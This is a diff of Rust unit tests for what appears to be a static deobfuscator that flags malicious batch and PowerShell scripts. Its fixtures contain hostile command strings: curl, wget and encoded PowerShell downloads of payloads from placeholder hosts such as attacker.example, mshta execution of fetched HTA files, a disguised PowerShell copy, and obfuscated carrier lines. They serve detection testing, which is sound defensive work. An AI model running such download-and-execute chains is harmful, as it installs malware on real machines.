+             $dec=$aes.CreateDecryptor();$plain=$dec.TransformFinalBlock($bytes,0,$bytes.Length)"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted 4096 high-Unicode chars from PowerShell carrier"),
+            "normalized AES high-Unicode carrier was not summarized: {}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&carrier),
+            "opaque carrier should not be dumped into deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn sandbox_truncated_high_unicode_payload_preserves_ascii_context() {
+        let carrier = "亓亮亊乑乑予之亖丱乵亞以仃仉产乆".repeat(256);
+        let path = r"C:\Windows\system32\rWhatsAppImage2026-05-12at12_37_26.vbs";
+        let script =
+            format!("&([scriptblock]::Create($drop={path};$payload=({carrier});...[truncated]");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.deobfuscated.contains(path),
+            "surviving script path was lost from high-Unicode summary: {}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&carrier),
+            "opaque carrier should not be dumped into deobfuscated output"
+        );
     }
 
     #[test]
@@ -5017,6 +7847,37 @@ mod line_cap_tests {
     }
 
     #[test]
+    fn encoded_set_carrier_runs_are_summarized() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let payload = "A".repeat(1024);
+        let text = (0..20)
+            .map(|idx| format!("set Carrier{idx}= 误{payload}\r\n"))
+            .collect::<String>();
+
+        let summarized = crate::summarize_encoded_set_carrier_line_runs(&text, &mut env);
+
+        assert!(
+            summarized.contains("harrington: omitted 20 encoded SET carrier lines"),
+            "carrier run was not summarized:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains("Carrier0"),
+            "raw carrier line leaked into summary:\n{summarized}"
+        );
+    }
+
+    #[test]
+    fn isolated_encoded_set_assignment_is_preserved() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let payload = "A".repeat(1024);
+        let text = format!("set Carrier= 误{payload}\r\n");
+
+        let summarized = crate::summarize_encoded_set_carrier_line_runs(&text, &mut env);
+
+        assert_eq!(summarized, text);
+    }
+
+    #[test]
     fn percent_substring_chain_fast_path_expands_whole_line() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.set("A", "echo");
@@ -5028,6 +7889,19 @@ mod line_cap_tests {
             .expect("chain-only line should use fast path");
 
         assert_eq!(expanded, "echo bacecho bacecho bacecho bac");
+    }
+
+    #[test]
+    fn percent_substring_chain_fast_path_drops_undefined_noise_refs() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("A", "echo");
+        let chunk = "%A:~0,1%%øNoise%%A:~1,1%%A:~2,1%%A:~3,1%";
+        let line = chunk.repeat(4);
+
+        let expanded = crate::fast_expand_percent_substr_chain_line(&line, &env)
+            .expect("substring chain with undefined noise refs should use fast path");
+
+        assert_eq!(expanded, "echoechoechoecho");
     }
 
     #[test]
@@ -5103,6 +7977,35 @@ mod line_cap_tests {
                 .iter()
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "URL hidden in summarized REM line should be rescued: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn caret_obfuscated_long_rem_noise_is_summarized_and_tail_url_rescued() {
+        let url = "https://caret-rem-tail.attacker.example/payload.bat";
+        let noise = "B".repeat(4096);
+        let script = format!("@echo off\r\nR^E^M {noise} {url}\r\n");
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("bytes from long REM comment line"),
+            "caret-obfuscated REM noise should be summarized, got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.lines().all(|line| line.len() < 512),
+            "summarized caret-obfuscated REM output should stay compact, got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "URL hidden in caret-obfuscated REM line should be rescued: {:?}",
             report.traits
         );
     }
@@ -5675,11 +8578,62 @@ mod goto_tests {
             .any(|t| matches!(t, Trait::GotoUnresolved { .. }));
         assert!(has, "no GotoUnresolved trait: {:?}", report.traits);
     }
+
+    #[test]
+    fn goto_resolves_forward_label_declaration_with_trailing_colon() {
+        use crate::traits::Trait;
+        let script = b"goto checkshit\r\necho DECOY\r\n:checkshit:\r\necho REAL\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo REAL"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("DECOY"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::GotoUnresolved { to_label, .. } if to_label == "checkshit"
+            )),
+            "trailing-colon label should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn goto_backward_trailing_colon_polling_loop_falls_through_for_static_iocs() {
+        use crate::traits::Trait;
+        let script = b":rdlcheck:\r\nif exist C:\\missing\\rdl.exe goto found\r\ngoto rdlcheck\r\n:found:\r\ncurl https://example.test/payload.exe -o payload.exe\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::GotoUnresolved { to_label, .. } if to_label == "rdlcheck"
+            )),
+            "backward polling loop should remain unresolved for static fallthrough: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://example.test/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "fallthrough IOC after polling loop was lost: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
 mod child_tests {
-    use crate::{analyze, Config};
+    use crate::{analyze, traits::Trait, Config};
 
     #[test]
     fn nested_cmd_c_recurses_into_child() {
@@ -5694,6 +8648,50 @@ mod child_tests {
             combined.contains("echo hi world") || report.deobfuscated.contains("echo hi world"),
             "no echo hi world in:\n{}",
             combined
+        );
+    }
+
+    #[test]
+    fn forfiles_c_recurses_into_nested_cmd_child() {
+        let script =
+            br#"forfiles /p C:\Users\Public /m *.txt /c "cmd /V:ON /c set X=hi&&echo !X! world""#;
+        let report = analyze(script, &Config::default());
+        let combined = format!(
+            "{}\n--children--\n{}",
+            report.deobfuscated,
+            report.extracted_cmd.join("\n---\n")
+        );
+        assert!(
+            combined.contains("echo hi world") || report.deobfuscated.contains("echo hi world"),
+            "forfiles /c child was not recursively analyzed:\n{}",
+            combined
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "forfiles")),
+            "forfiles LOLBAS trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn forfiles_c_nested_cmd_surfaces_download_trait() {
+        let script =
+            br#"forfiles /m *.txt /c "cmd /c curl -o out.exe https://forfiles.example/p.exe""#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://forfiles.example/p.exe"
+                            && dst.as_deref() == Some("out.exe")
+                )
+            }),
+            "nested forfiles curl download not surfaced: {:?}",
+            report.traits
         );
     }
 }
@@ -5731,6 +8729,94 @@ mod if_tests {
         // The whole `if "a"=="b" echo match` is dispatched as one command to h_if.
         // The body "echo match" is never independently dispatched. Just verify no panic.
         let _ = report;
+    }
+
+    #[test]
+    fn if_exist_quoted_path_with_spaces_resolves() {
+        let script = br#"echo payload>"C:\Users\Public\has space.txt"
+if exist "C:\Users\Public\has space.txt" set MARK=found
+echo %MARK%
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo found"),
+            "quoted if-exist path with spaces did not resolve:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { condition } if condition.contains("has space.txt"))),
+            "quoted if-exist path should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_not_exist_empty_quoted_operand_resolves_true() {
+        let script = br#"if not exist "" echo empty-missing
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo empty-missing"),
+            "empty quoted if-exist operand should resolve false before NOT:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { condition } if condition.contains("exist \"\""))),
+            "empty quoted if-exist operand should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_not_exist_unknown_quoted_path_with_spaces_does_not_skip_later_iocs() {
+        let script = br#"if not exist "C:\Program Files\missing marker" goto ownpc
+curl https://payload.example/stage.exe -o stage.exe
+:ownpc
+echo done
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated
+                .contains("curl https://payload.example/stage.exe -o stage.exe"),
+            "unknown quoted path with spaces should not be assumed absent and skip later IOCs:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::Download { src, .. }
+                    if src == "https://payload.example/stage.exe"
+            )),
+            "later download IOC should still be extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn vbs_style_if_then_does_not_emit_batch_if_unresolved() {
+        let script = br#"If backbear.Status = 200 Then
+WScript.Echo "ok"
+End If
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::IfNotResolved { condition }
+                    if condition.contains("backbear.Status")
+            )),
+            "VBS If...Then line should not be reported as unresolved batch IF: {:?}",
+            report.traits
+        );
     }
 }
 
@@ -5777,6 +8863,66 @@ mod if_constant_fold_tests {
     }
 
     #[test]
+    fn if_slash_i_not_order_is_case_insensitive_negated() {
+        let script = b"if /I not \"script.bat\"==\"other.bat\" set MARK=value\r\nif /I not \"script.bat\"==\"SCRIPT.BAT\" set MARK=bad\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "negated case-insensitive comparison did not run inline body:\n{}",
+            report.deobfuscated
+        );
+        let has_unresolved = report
+            .traits
+            .iter()
+            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
+        assert!(
+            !has_unresolved,
+            "/I before NOT should fold cleanly: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_top_level_percent_one_defaults_empty() {
+        let script = b"if \"%1\"==\"\" set MARK=empty\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo empty"),
+            "top-level %1 should fold to empty and run inline body:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { condition } if condition.contains("%1"))),
+            "top-level %1 condition should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_top_level_percent_tilde_one_defaults_empty() {
+        let script = b"if \"%~1\"==\"hidden\" set MARK=bad\r\necho after\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo after"),
+            "top-level %~1 false branch should not suppress following line:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { condition } if condition.contains("%~1"))),
+            "top-level %~1 condition should not stay unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn if_gtr_lss_geq_leq() {
         for (op, expected_unresolved) in [
             ("gtr 5", false),
@@ -5798,6 +8944,66 @@ mod if_constant_fold_tests {
         assert_eq!(
             unresolved_count, 0,
             "all 4 relational ops should fold cleanly"
+        );
+    }
+
+    #[test]
+    fn if_percent_errorlevel_geq_zero_inline_set_is_constant_true() {
+        let script = b"if %ERRORLEVEL% GEQ 0 set MARK=value\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "inline set did not run, got:\n{}",
+            report.deobfuscated
+        );
+        let has_unresolved = report
+            .traits
+            .iter()
+            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
+        assert!(
+            !has_unresolved,
+            "invariant errorlevel GEQ 0 should fold true: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_errorlevel_zero_inline_set_is_constant_true() {
+        let script = b"if errorlevel 0 set MARK=value\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "inline set did not run, got:\n{}",
+            report.deobfuscated
+        );
+        let has_unresolved = report
+            .traits
+            .iter()
+            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
+        assert!(
+            !has_unresolved,
+            "errorlevel 0 should fold true: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_errorlevel_nonzero_stays_unresolved() {
+        let script = b"if errorlevel 1 echo MAYBE\r\necho AFTER\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::IfNotResolved { condition }
+                    if condition == "errorlevel 1 echo MAYBE"
+            )),
+            "dynamic errorlevel threshold should stay unresolved: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("echo AFTER"),
+            "following line should remain visible, got:\n{}",
+            report.deobfuscated
         );
     }
 }
@@ -5948,6 +9154,42 @@ mod start_tests {
             env.exec_cmd
         );
     }
+
+    #[test]
+    fn quoted_spaced_powershell_path_dispatches() {
+        use base64::Engine;
+
+        let mut env = Environment::new(&Config::default());
+        let ps = "Invoke-WebRequest https://quoted-spaced-path.example/p.exe";
+        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        interpret_line(
+            &format!(r#""C:\Program Files\PowerShell\7\pwsh.exe" -EncodedCommand {b64}"#),
+            &mut env,
+        );
+        let expected_url_utf16: Vec<u8> = "https://quoted-spaced-path.example/p.exe"
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        assert!(
+            env.exec_ps1.iter().any(|body| body
+                .windows(expected_url_utf16.len())
+                .any(|window| window == expected_url_utf16.as_slice())),
+            "quoted spaced PowerShell path did not dispatch: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn start_empty_title_flag_quoted_cmd_recurses() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"start "" /B "cmd.exe" /c echo quoted-start"#, &mut env);
+        assert!(
+            env.exec_cmd.iter().any(|cmd| cmd == "echo quoted-start"),
+            "quoted start executable did not recurse into cmd: {:?}",
+            env.exec_cmd
+        );
+    }
 }
 
 #[cfg(test)]
@@ -5988,6 +9230,31 @@ mod powershell_tests {
         let stored = String::from_utf8_lossy(&env.exec_ps1[0]).into_owned();
         let trimmed: String = stored.chars().filter(|c| *c != '\0').collect();
         assert_eq!(trimmed, payload);
+    }
+
+    #[test]
+    fn powershell_attached_encoded_command_extracts() {
+        let payload = "Write-Host attached";
+        let utf16: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
+        let mut env = Environment::new(&Config::default());
+        interpret_line(&format!("powershell -EncodedCommand:{b64}"), &mut env);
+        assert_eq!(env.exec_ps1.len(), 1);
+        let stored = String::from_utf8_lossy(&env.exec_ps1[0]).into_owned();
+        let trimmed: String = stored.chars().filter(|c| *c != '\0').collect();
+        assert_eq!(trimmed, payload);
+    }
+
+    #[test]
+    fn powershell_attached_command_flag_captures_raw() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"powershell -Command:"Get-Process""#, &mut env);
+        assert_eq!(env.exec_ps1.len(), 1);
+        let stored = String::from_utf8_lossy(&env.exec_ps1[0]);
+        assert_eq!(stored, "Get-Process");
     }
 
     #[test]
@@ -6083,6 +9350,31 @@ mod powershell_tests {
             r.deobfuscated
         );
     }
+
+    #[test]
+    fn xcopy_copied_powershell_alias_encoded_command_extracts() {
+        let payload = "iwr https://xcopy-copied-ps.example/stage";
+        let utf16: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let script = format!(
+            "echo F | xcopy /d /q /y /h /i C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe %temp%\\Ckiczrjbb.png\r\n\
+             %temp%\\Ckiczrjbb.png -win 1 -enc {b64}\r\n",
+        );
+        let r = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            r.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                    if src == "https://xcopy-copied-ps.example/stage"
+            )),
+            "xcopy renamed PowerShell encoded payload URL not extracted: {:?}\n{}",
+            r.traits,
+            r.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -6115,6 +9407,76 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_short_option_cluster_remote_name_uses_basename_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -LO https://curl-cluster-remote-name.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has_download_dst = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://curl-cluster-remote-name.example/payload.hta"
+                        && dst == "payload.hta"
+            )
+        });
+        assert!(
+            has_download_dst,
+            "curl -LO did not record remote-name destination: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://curl-cluster-remote-name.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta local HTA did not resolve curl -LO download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn curl_remote_name_with_output_dir_tracks_joined_destination_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl --output-dir C:\Temp -O https://curl-output-dir-mshta.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has_download_dst = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://curl-output-dir-mshta.example/payload.hta"
+                        && dst == r#"C:\Temp\payload.hta"#
+            )
+        });
+        assert!(
+            has_download_dst,
+            "curl output-dir remote-name did not record joined destination: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://curl-output-dir-mshta.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta local HTA did not resolve curl output-dir download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn curl_without_output_records_src_only() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl http://x/y", &mut env);
@@ -6124,6 +9486,32 @@ mod curl_tests {
             )
         });
         assert!(has, "traits: {:?}", env.traits);
+    }
+
+    #[test]
+    fn curl_schemeless_domain_path_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\stage.exe curl-schemeless.example/payload.exe"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "http://curl-schemeless.example/payload.exe",
+                Some(r#"C:\Temp\stage.exe"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -6171,11 +9559,1094 @@ mod curl_tests {
             env.traits
         );
     }
+
+    #[test]
+    fn curl_short_proxy_url_does_not_become_download_src() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "curl -x http://proxy.example:8080 -o out.exe https://curl-actual.example/payload.exe",
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://curl-actual.example/payload.exe", Some("out.exe"))],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_uppercase_long_proxy_url_does_not_become_download_src() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "curl --PROXY http://proxy-only.example:8080 --OUTPUT NUL",
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            Vec::<(&str, Option<&str>)>::new(),
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_output_equals_records_destination() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --output=C:\Temp\payload.bin https://curl-output.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-output.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_url_flag_separated_records_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --url https://curl-separated-url.example/payload.bin -o C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-separated-url.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_attached_long_options_are_case_insensitive() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --URL=https://curl-upper-url.example/payload.bin --OUTPUT=C:\Temp\upper.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-upper-url.example/payload.bin",
+                Some(r#"C:\Temp\upper.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_spaced_long_output_option_is_case_insensitive() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --OUTPUT C:\Temp\upper-spaced.bin https://curl-upper-spaced-output.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-upper-spaced-output.example/payload.bin",
+                Some(r#"C:\Temp\upper-spaced.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_short_o_glued_records_destination() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -oC:\Temp\payload.bin https://curl-short-o.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-short-o.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_short_option_cluster_records_destination() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -fsSLo C:\Temp\payload.bin https://curl-cluster.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-cluster.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_url_equals_records_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --url=https://curl-url.example/payload.bin --output out.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://curl-url.example/payload.bin", Some("out.bin"))],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
+mod wget_tests {
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn wget_output_flag_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget --no-check-certificate https://wget-direct.example/payload.bin -O C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-direct.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+        assert!(env
+            .modified_filesystem
+            .contains_key(r#"c:\temp\payload.bin"#));
+    }
+
+    #[test]
+    fn wget_lowercase_o_logfile_is_not_download_destination() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget -o wget.log https://wget-log.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://wget-log.example/payload.bin", None)],
+            "traits: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.modified_filesystem.contains_key("wget.log"),
+            "wget logfile was tracked as a payload destination: {:?}",
+            env.modified_filesystem
+        );
+    }
+
+    #[test]
+    fn wget_lowercase_p_page_requisites_is_not_destination_prefix() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"wget -p https://wget-page.example/index.html"#, &mut env);
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://wget-page.example/index.html", None)],
+            "traits: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.modified_filesystem
+                .contains_key("https://wget-page.example/index.html"),
+            "wget page-requisites URL was tracked as a destination: {:?}",
+            env.modified_filesystem
+        );
+    }
+
+    #[test]
+    fn wget_long_directory_prefix_records_destination_prefix() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget --directory-prefix C:\Temp https://wget-prefix.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-prefix.example/payload.bin",
+                Some(r#"C:\Temp"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_directory_prefix_tracks_url_basename_for_later_execution() {
+        let report = crate::analyze(
+            br#"wget --directory-prefix C:\Temp https://wget-prefix-mshta.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://wget-prefix-mshta.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta local HTA did not resolve wget directory-prefix download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn wget_glued_short_directory_prefix_tracks_url_basename_for_later_execution() {
+        let report = crate::analyze(
+            br#"wget -PC:\Temp https://wget-glued-prefix-mshta.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has_download_prefix = report.traits.iter().any(|t| {
+            matches!(
+                t,
